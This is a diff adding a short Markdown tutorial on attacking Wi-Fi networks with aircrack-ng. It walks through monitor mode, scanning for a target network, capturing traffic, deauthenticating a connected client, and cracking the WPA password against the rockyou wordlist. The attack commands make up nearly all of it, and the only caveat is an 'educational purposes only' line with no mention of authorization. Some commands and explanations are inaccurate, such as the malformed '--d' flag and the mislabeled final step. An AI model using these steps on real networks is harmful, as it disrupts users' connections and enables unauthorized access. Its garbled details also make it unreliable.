@@ -1,0 +1,73 @@
+---
+title: "Deauthentication attack with a wordlist"
+tag: "wifi"
+---
+
+This is a simple tutorial on how to perform a deauthentication attack on a
+wireless network using a wordlist on Kali Linux. For educational purposes only.
+
+## 1. Put your wireless card in monitor mode
+
+```
+ip a
+```
+
+this will show you the name of your wireless card, in my case it's `wlan0`
+
+```
+airmon-ng start wlan0
+```
+
+this will put your wireless card in monitor mode, in my case it's now `wlan0mon`
+
+this switches the network card to monitor mode, which allows us to see all the
+traffic on the network
+
+## 2. Find the name of the network you want to attack
+
+```
+airodump-ng wlan0mon
+```
+
+this will show you all the networks in range, find the one you want to attack
+and copy the name of it. You need the BSSID and the channel number.
+
+## 3. Start capturing packets
+
+```
+airodump-ng --d <BSSID> -c <CHANNEL> -w FILENAME wlan0mon
+```
+
+this will start capturing packets from the network you want to attack, it will
+save them in a file called `FILENAME.cap`. You can stop this process by pressing
+`CTRL + C`. Take note of the STATION of the client you want to attack.
+
+## 4. Deauthenticate a client
+
+```
+aireplay-ng -0 10 -a <BSSID> -c <STATION> wlan0mon 
+```
+
+this will deauthenticate the client from the network, it will send 10 packets 
+to the client. You can stop this process by pressing `CTRL + C`. It will interuppt 
+the connection of the client from the network. Sometimes it doesn't work first try but 
+it usually works after a few tries.
+
+## 5. Crack the password
+
+```
+aircrack-ng FILENAME.cap -w WORDLIST
+```
+
+WORDLIST is the path to the wordlist you want to use to crack the password. 
+Typically the wordlist is located in `/usr/share/wordlists/rockyou.txt`
+
+This will crack the password of the network and show it to you.
+
+## 6. Stop capturing packets
+
+```
+airmon-ng stop wlan0mon
+```
+
+this will stop capturing packets and put your wireless card back in managed mode
